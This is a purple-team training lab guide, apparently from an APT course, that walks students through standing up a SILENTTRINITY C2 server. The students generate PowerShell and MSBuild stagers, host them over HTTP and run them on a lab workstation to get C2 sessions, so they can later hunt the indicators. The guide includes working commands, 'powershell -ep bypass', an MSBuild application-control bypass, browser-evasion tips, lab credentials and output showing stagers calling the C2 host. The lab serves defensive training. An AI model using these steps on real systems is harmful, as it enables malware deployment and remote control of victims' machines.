# APT0030.2-Red -Attack Silent Trinity Attack
![](images/logo.png)

![Lab Contents][LabContents]
<!-- Start Document Outline -->

* [Linux - SSH Session 1 (Team Server)](#linux---ssh-session-1-team-server)
	* [Login to Member Server](#login-to-member-server)
	* [PowerShell](#powershell)
	* [Putty Session](#putty-session)
	* [Create Silent Trinity TeamServer](#create-silent-trinity-teamserver)
* [Linux - SSH Session 2 (Attacker Session)](#linux---ssh-session-2-attacker-session)
	* [Connect to SilentTrinity with Attack Client](#connect-to-silenttrinity-with-attack-client)
		* [Login to Member Server](#login-to-member-server-1)
		* [PowerShell](#powershell-1)
	* [Connecting and Configuring the Silent Trinity Attack Server](#connecting-and-configuring-the-silent-trinity-attack-server)
		* [Screen](#screen)
		* [ST Client](#st-client)
		* [Configure Command and Control Server](#configure-command-and-control-server)
		* [Create Stager Malware](#create-stager-malware)
* [Linux - SSH Session 3 (Malware Host)](#linux---ssh-session-3-malware-host)
	* [Connect to the SSH Server](#connect-to-the-ssh-server)
		* [Login to Member Server](#login-to-member-server-2)
	* [PowerShell](#powershell-2)
		* [Connecting to the SSH Server](#connecting-to-the-ssh-server-1)
	* [Move Malware Stagers](#move-malware-stagers)
	* [Host Malware Stagers via HTTP](#host-malware-stagers-via-http)
* [Malware Stager Procurement](#malware-stager-procurement)
	* [Login to Member Server](#login-to-member-server-3)
	* [Download Stagers](#download-stagers)
* [Malware Artifact Execution](#malware-artifact-execution)
	* [Login to Member Server](#login-to-member-server-4)
	* [Powershell](#powershell-3)
	* [Execution of HTTPS Stager](#execution-of-https-stager)
	* [Execution of MSBuild Stager](#execution-of-msbuild-stager)
* [Command and Control Sessions](#command-and-control-sessions)

<!-- End Document Outline -->
![][Div1]

![Lab Overview][LabOverview]

In this lab, the student will stand up a C2 framework, create a listener for two malware implants, generate stagers, and detonate the payloads. The malware will leave a trail of IoCs that are discover-able in Elastic.  

![][Div2]

![Lab Overview][LabObjectives]
* Formulate a basic understanding of the malware generation and staging process. 
* Establish command and control sessions. 

![][Div2]


![Lab Overview][LabMethodology]

Initiate a Command and Control framework.  Create malware and launch the Command and Control malware session on the Windows 10 workstation.  Hunt for Indicators of Compromise.



![][Div1]
## Sysmon Install
The lab environment provided by either Defense Origins or the APT-Lab-Terraform build may not have fully executed the Sysmon installation as previously discussed.  Complete the following process to finalize the lab environment:

* Login to the workstation (Member Server) at WS01 using the specified domain context passwords.
* Open a PowerShell window and run the following commands. 
```
cd \\dc01\labs\sysmon\
./sysmon64.exe -accepteula -i sysmonconfig.xml
```
This will complete the installation of Sysmon on the workstation (Member Server)

![][Div1]

![Attack Step One][AttackStepOne] 
## Linux - SSH Session 1 (Team Server)
To begin this lab, you will first connect to the Member Server (WS01).  Then, you will connect to the Linux server at 10.10.98.20.  
For this lab you will need to create multiple SSH sessions; take care to operate each SSH session independently.  
Upon the first connection to an SSH server, you may get a popup warning to accept the remote server's SSL certificate.  Accept the certificate and you will be prompted for credentials as a new window opens.  The new window (it will have a black background) is the Putty SSH session.  When you close the Putty window, the SSH session is disconnected.   During this lab it will be necessary to have multiple SSH sessions Open.
* **A note on Putty:** As Windows to continue its maturity in managing cross-platform operating systems it formalize its plan to use OpenSSL for its capability to connect with remote systems, including Linux.  Currently the OpenSSL platform for Windows is in Beta and available on Windows 10.The necessarily dependencies are not yet fully enabled on Windows 2016. If you were operating from a Windows 10 system, it would be possible to install the OpenSSL module for Windows 10.  For this course however, we are using the "Putty" SSH client with its command line arguments.

![][Div2]

### Login to Member Server
Connect via Remote Desktop to the Member Server, WS01.
* If you are already connected, use the current session.
* See Lab [L0200][L0200] for connection instructions.

![][Div2]


### PowerShell
Launch Windows PowerShell from the Windows Start Menu.
* See Lab [L0250][L0250] for instruction on launching PowerShell

![][Div2]

### Putty Session
With the Powershell window open, run the following command which will launch Putty and initiate a connection to the server at 10.10.98.20.   The command instructs putty to open an SSH session on 10.10.98.20 and specify the "itadmin" username.

```powershell
putty -ssh itadmin@10.10.98.20
```
As previously discussed, you may receive an alert regarding the SSH server SSL certificate.  You will then be prompted for credentials.
The password for the "itadmin@10.10.98.20" account is:
```plaintext
APTClass!
```


| ![](images/L1130-1a.gif) |
|----------|




![][Div2]


### Create Silent Trinity TeamServer
Working now within the Putty session:
Use the following commands to access the SILENTTRINITY directory as root and access the virtual environment:

![Bash Input][BashInput]
```bash
cd /opt/SilentTrinity
```
The next two commands take care of ST’s prerequisite installations that are difficult to automate. 

![Bash Input][BashInput]
```bash
python3.8 -m pip install netifaces
python3.8 -m pip install cffi
```
Launch the Silent Trinity Team Server

![Bash Input][BashInput]
```bash
sudo python3.8 st teamserver --port 81 10.10.98.20 APTClass!
```

![Bash Output][BashOutput]

| ![](images/L1130-1b.gif) |
|----------|



![][NextStep]

![][Div1]



![Attack Step Two][AttackStepTwo] 
## Linux - SSH Session 2 (Attacker Session)
For this lab you will need to create multiple SSH sessions; take care to operate each SSH session independently.  
* To continue this lab, create the second SSH session with PuTTY, connecting to 10.10.98.20.  
* You can launch a second PuTTY session to do this.


### Connect to SilentTrinity with Attack Client
SSH to 10.10.98.20 using the PuTTY client installed on the WS01 system. Open a Powershell and then execute putty using the command line.

#### Login to Member Server
Connect via Remote Desktop to the Member Server, WS01.
* If you are already connected, use the current session.
* See Lab [L0200][L0200] for connection instructions.


![][Div2]


#### PowerShell
Launch Windows PowerShell from the Windows Start Menu.
* See Lab [L0250][L0250] for instruction on launching PowerShell


![][Div2]


##### Connecting to the SSH Server
From the powershell window, again connect to the Linux server with putty.

![PowershellInput][PowerShellInput]

```powershell
putty -ssh itadmin@10.10.98.20
```

![][Div2]


### Connecting and Configuring the Silent Trinity Attack Server
We will now use the Bash prompts on the SSH server to create a screen session, followed by connecting to the ST server.

#### Screen
A screen session will allow a persistent SSH session.

![Bash Input][BashInput]

```bash
screen -S ST-Client
cd /opt/SilentTrinity
```
It is the same process to get to this point for both Console Session 1 and Console Session 2 (and the same outcome).  
* Note the use of the “screen” command that will launch a nested SSH console session that will survive the SSH session becoming disconnected.
* Also note the escaped ‘!’ in the client connection string. 

![][Div2]

#### ST Client
Now, connect to the team-server as a client with the following command:

![Bash Input][BashInput]

```bash
sudo python3.8 st client wss://itadmin:APTClass\!@10.10.98.20:81
```
You will now be connected to the Silent Trinity C2 server.

![][Div2]


#### Configure Command and Control Server
Once the SilentTrinity client as connected, execute the following commands one at a time. 

![Silent Trinity Input][STInput]
```bash
listeners
use https
set port 4444
options
start
```

There is a now a listener running on TCP port 4444 waiting for connections.

![][Div2]

#### Create Stager Malware
The instructions in this package tell the client to reach out to the command server for the remaining instructions (bits / bytes / malware stage). But there is no stager instruction set yet.
* Generate the stager using the following commands 

![Silent Trinity Input][STInput]

```bash
stagers
use powershell
generate https
use msbuild
generate https
```

Both stagers now reside in the /opt/SilentTrinity/ directory. 


![Silent Trinity Output][STOutput]

| ![](images/L1130-1c.gif) |
|----------|


The next step of this lab will open a third SSH session, create a new directory to host the malware stagers, move the stagers and host the malware stagers.  

![][NextStep]

![][Div1]

![Attack Step Three][AttackStepThree] 
## Linux - SSH Session 3 (Malware Host)
For this lab you will need to create multiple SSH sessions; take care to operate each SSH session independently.  
* To continue this lab, create the **third** SSH session with PuTTY, connecting to 10.10.98.20.
* Similar as before, use launch putty via its command line arguments to do this.

### Connect to the SSH Server
![][Div2]
#### Login to Member Server
Connect via Remote Desktop to the Member Server, WS01.
* If you are already connected, **use the current session.**
* See Lab [L0200][L0200] for connection instructions.


![][Div2]
### PowerShell
Launch Windows PowerShell from the Windows Start Menu.
* See Lab [L0250][L0250] for instruction on launching PowerShell


![][Div2]
#### Connecting to the SSH Server
From the powershell window, again connect to the Linux server with putty.

![PowershellInput][PowerShellInput]

```powershell
putty -ssh itadmin@10.10.98.20
```

![][Div2]


### Move Malware Stagers
Now that the malware stagers have been generated, lets move them into a new folder.

![Bash Input][BashInput]
```bash
sudo -s
mkdir /opt/web
mv /opt/SilentTrinity/stager.* /opt/web
cd /opt/web
ls
```
![][Div2]



### Host Malware Stagers via HTTP
Next, host the malware with python3’s http.server module.

![Bash Input][BashInput]

```bash
python3 -m http.server
```

![Bash Output][BashOutput]

| ![](images/L1130-1d.gif) |
|----------|


Now that the malware is being hosted on the Linux server, the next steps of the lab will download and execute the malware on the workstation.  The malware is now being hosted at http://10.10.98.20:8000.




![][NextStep]

![][Div1]

![Attack Step Four][AttackStepFour] 
## Malware Stager Procurement
Now that the SilentTrinity framework is running, we have an attacker client connected, malware generated and served, its time to download the malware and attempt to execute it on the Member Server, WS01.  

![][Div2]
#### Login to Member Server
Connect via Remote Desktop to the Member Server, WS01.
* If you are already connected, use the current session.
* See Lab [L0200][L0200] for connection instructions.


![][Div2]
### Download Stagers
Open Internet Explorer.  
* You may be prompted for first-time Set up. If so, choose **Don’t use recommended settings**. 
* Students are advised to use IE11 for the malware downloads as it is the least likely browser to flag the files. 
* Note that it would be possible to again use Invoke-Webrequest for downloading the malware.  However, by using a different download method, we are able to determine if certain browser activity is noticed by optics.

Navigate using Internet Explorer’s address bar to http://10.10.98.20:8000 and download both stagers. 

```plaintext
http://10.10.98.20:8000
```

**Right (alternate) click** both items and choose **Save target as...** Both items should be saved under the user’s **Downloads** folder. 

| ![](images/L1130-1f.png) |
|----------|


A warning may be presented that can be ignored. 

| ![](images/L1130-1e.png) |
|----------|

After the malware stagers have been downloaded, continue onto the next step of the lab to execute the malware.

![][NextStep]

![][Div1]

 ![Attack Step Five][AttackStepFive] 
## Malware Artifact Execution
Continuing with the Remote Desktop Session on Member Server WS01, we now will execute the downloaded malware.

### Login to Member Server
Connect via Remote Desktop to the Member Server, WS01.
* If you are already connected, use the current session.
* See Lab [L0200][L0200] for connection instructions.

### Powershell
Launch Windows PowerShell from the Windows Start Menu.
See Lab [L0250][L0250] for instruction on launching PowerShell.

![][Div2]

### Execution of HTTPS Stager
In PowerShell, run the following command to execute the malware stager for Silent Trinity.

![PowershellInput][PowerShellInput]
```powershell
powershell -ep bypass
Import-Module .\Downloads\stager.ps1
```
![PowershellOutput][PowerShellOutput]

```powershell
C:\Users\itaadmin.labs> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\taadmin.labs> Import-Module .\Downloads\stager.ps1
[+] URLS: https://10.10.98.20:4444
[*] Attempting HTTP POST to https://10.10.98.20:4444/162f4b13-6181-4d7f-988f-4da6c43fc307
[-] Attempt #1
[*] Attempting HTTP GET to https://10.10.98.20:4444/162f4b13-6181-4d7f-988f-4da6c43fc307
[-] Attempt #1
[*] Downloaded 569104 bytes
        [-] 'Boo.Lang.Compiler.dll' was required...
        [+] 'Boo.Lang.Compiler.dll' loaded...
        [-] 'Boo.Lang.dll' was required...
        [+] 'Boo.Lang.dll' loaded...

[*] Compiling Stage Code
        [-] 'Boo.Lang.Extensions.dll' was required...
        [+] 'Boo.Lang.Extensions.dll' loaded...
        [-] 'System.dll' was required...
        [+] 'System.dll' loaded...
        [-] 'System.Core.dll' was required...
        [+] 'System.Core.dll' loaded...
        [-] 'System.Web.Extensions.dll' was required...
        [+] 'System.Web.Extensions.dll' loaded...
        [-] 'Boo.Lang.Parser.dll' was required...
        [+] 'Boo.Lang.Parser.dll' loaded...
        [-] 'Microsoft.VisualBasic.Devices.dll' was required...
        [-] 'Microsoft.VisualBasic.dll' was required...
        [+] 'Microsoft.VisualBasic.dll' loaded...
[+] Compilation Successful!
[*] Executing
sYJwhAelHQ CheckIn
```
After the malware stager has been executed, continue on to the next phase of the lab.

![][Div2]

### Execution of MSBuild Stager
Under the context of an environment where application control is in effect the MSBuild.exe binary can be useful. While this lab environment does not restrict application execution in this manner, this lab section will demonstrate malware stager executed using Microsoft-Signed MSBuild. 

Next, in Powershell, run the following command to execute the stager for Silent Trinity with the trusted MSBuild binary.

![PowershellInput][PowerShellInput]
```powershell
cd c:\Windows\Microsoft.NET\Framework64\v4.0.30319\
.\MSBuild.exe c:\Users\itadmin\Downloads\stager.xml

     (Note if the above fails, try:)

.\MSBuild.exe c:\Users\itadmin.labs\Downloads\stager.xml

```

![PowershellOutput][PowerShellOutput]

```powershell
C:\Users\taadmin.labs>
C:\Users\taadmin.labs> cd c:\Windows\Microsoft.NET\Framework64\v4.0.30319\

c:\Windows\Microsoft.NET\Framework64\v4.0.30319>MSBuild.exe c:\Users\taadmin.labs\Downloads\stager.xml
Microsoft (R) Build Engine version 4.8.3752.0
[Microsoft .NET Framework, version 4.0.30319.42000]
Copyright (C) Microsoft Corporation. All rights reserved.

Build started 3/16/2020 6:58:05 PM.
[+] URLS: https://10.10.98.20:4444
[*] Attempting HTTP POST to https://10.10.98.20:4444/521a336b-e199-4bff-a81a-2207f37d79b2
[-] Attempt #1
[*] Attempting HTTP GET to https://10.10.98.20:4444/521a336b-e199-4bff-a81a-2207f37d79b2
[-] Attempt #1
[*] Downloaded 569104 bytes
        [-] 'Boo.Lang.Compiler.dll' was required...
        [+] 'Boo.Lang.Compiler.dll' loaded...
        [-] 'Boo.Lang.dll' was required...
        [+] 'Boo.Lang.dll' loaded...

[*] Compiling Stage Code
        [-] 'Boo.Lang.Extensions.dll' was required...
        [+] 'Boo.Lang.Extensions.dll' loaded...
        [-] 'Boo.Lang.Parser.dll' was required...
        [+] 'Boo.Lang.Parser.dll' loaded...
        [-] 'Microsoft.VisualBasic.Devices.dll' was required...
[+] Compilation Successful!
[*] Executing
z8DiGrOcG3 CheckIn
```

Having launched both the malware stagers from PowerShell and from MSBuild, the next lab steps will check to ensure that the Command-and-Control malware has checked into the team-server.

![][Div1]
![Attack Step Six][AttackStepSix]
## Command and Control Sessions
After having configured the team-server, configured, built, hosted, and executed the Command and Control malware, the workstation should now have created two command and control sessions to the team-server.  

Return to the SSH session that was operating the team-server's client (SSH Session Two).
Check the team server's client side for client sessions with the following commands:

![Silent Trinity Input][STInput]
```plaintext
sessions
list
```

![Silent Trinity Output][STOutput]
```plaintext
[1] ST (stagers)(msbuild) ≫ sessions
[1] ST (sessions) ≫ list
┌Sessions──────────────────────────────┬─────────────────────────────┬──────────────┬──────────────┐
│ Name                                 │ User                        │ Address      │ Last Checkin │
├──────────────────────────────────────┼─────────────────────────────┼──────────────┼──────────────┤
│ 521a336b-e199-4bff-a81a-2207f37d79b2 │ LABS\itaadmin@WS10-01 │ 10.10.98.231 │ 00h 00m 01s  │
├──────────────────────────────────────┼─────────────────────────────┼──────────────┼──────────────┤
│ 162f4b13-6181-4d7f-988f-4da6c43fc307 │ LABS\itadmin@WS10-01 │ 10.10.98.231 │ 00h 00m 00s  │
└──────────────────────────────────────┴─────────────────────────────┴──────────────┴──────────────┘
[1] ST (sessions) ≫
```

With having built a C2 Framework and connected the Member Server into the framework, lets begin the hunt.  

Next Lab: L1130-Hunt

![][Div1]

![Lab Complete][LabComplete]


  [LabContents]:https://img.shields.io/badge/Lab-Contents-purple.svg?style=for-the-badge
  [LabAddendum]:https://img.shields.io/badge/Lab-Addendum-magenta.svg?style=for-the-badge
  [LabOverview]:https://img.shields.io/badge/Lab-Overview-darkblue.svg?style=for-the-badge
  [LabObjectives]:https://img.shields.io/badge/Lab-Objectives-darkblue.svg?style=for-the-badge
  [LabMethodology]:https://img.shields.io/badge/Lab-Methodology-darkblue.svg?style=for-the-badge
  [LabComplete]:https://img.shields.io/badge/Lab-Complete-red.svg?style=for-the-badge
  [NextStep]:https://img.shields.io/badge/Step%20Complete-Onward!-darkgreen.svg?style=flat-sware
  [PowershellInput]:https://img.shields.io/badge/Powershell-Input-green.svg?style=flat-sware
  [BashInput]:https://img.shields.io/badge/Bash-Input-green.svg?style=flat-sware
  [BashOutput]:https://img.shields.io/badge/Bash-Output-orange.svg?style=flat-sware
  [STInput]:https://img.shields.io/badge/SilentTrinity-Input-green.svg?style=flat-sware
  [STOutput]:https://img.shields.io/badge/SilentTrinity-Output-orange.svg?style=flat-sware
  [HuntSearchTerm]:https://img.shields.io/badge/Hunt-Search%20Term-blue.svg?style=flat-sware
  [PowershellOutput]:https://img.shields.io/badge/Powershell-Output-orange.svg?style=flat-sware
  [GuiNav]:https://img.shields.io/badge/GUI-Navigation-orange.svg?style=flat-sware
  [StepOne]:https://img.shields.io/badge/Step-One-blue.svg?style=for-the-badge
  [StepTwo]:https://img.shields.io/badge/Step-Two-blue.svg?style=for-the-badge
  [StepThree]:https://img.shields.io/badge/Step-Three-blue.svg?style=for-the-badge
  [StepFour]:https://img.shields.io/badge/Step-Four-blue.svg?style=for-the-badge
  [StepFive]:https://img.shields.io/badge/Step-Five-blue.svg?style=for-the-badge
  [StepSix]:https://img.shields.io/badge/Step-Six-blue.svg?style=for-the-badge
  [AttackStepOne]:https://img.shields.io/badge/Attack-Step%20One-red.svg?style=for-the-badge 
  [AttackStepTwo]:https://img.shields.io/badge/Attack-Step%20Two-red.svg?style=for-the-badge
  [AttackStepThree]:https://img.shields.io/badge/Attack-Step%20Three-red.svg?style=for-the-badge 
  [AttackStepFour]:https://img.shields.io/badge/Attack-Step%20Four-red.svg?style=for-the-badge
  [AttackStepFive]:https://img.shields.io/badge/Attack-Step%20Five-red.svg?style=for-the-badge
  [AttackStepSix]:https://img.shields.io/badge/Attack-Step%20Six-red.svg?style=for-the-badge
  [HuntStepOne]:https://img.shields.io/badge/Hunt-Step%20One-blue.svg?style=for-the-badge
  [HuntStepTwo]:https://img.shields.io/badge/Hunt-Step%20Two-blue.svg?style=for-the-badge
  [HuntStepThree]:https://img.shields.io/badge/Hunt-Step%20Three-blue.svg?style=for-the-badge
  [HuntStepFour]:https://img.shields.io/badge/Hunt-Step%20Four-blue.svg?style=for-the-badge
  [APTStepOne]:https://img.shields.io/badge/APT-Step%20One-purple.svg?style=for-the-badge
  [PurpleTeam]:https://img.shields.io/badge/Team-Purple-purple.svg?style=for-the-badge
  [Div1]:../../docs/images/divider%201.png
  [Div2]:../../docs/images/divider%202.png
  [L0200]: ../L0200/
  [L0250]: ../L0250/
  [L0310]: ../L0310/
  [L0311]: ../L0311/
  [L0320]: ../L0320/
  [L0330]: ../L0330/
  [L0340]: ../L0340/
  [L0350]: ../L0350/
  [L1120]: ../L1120/
  [L1130]: ../L1130/
  [L1140]: ../L1140/
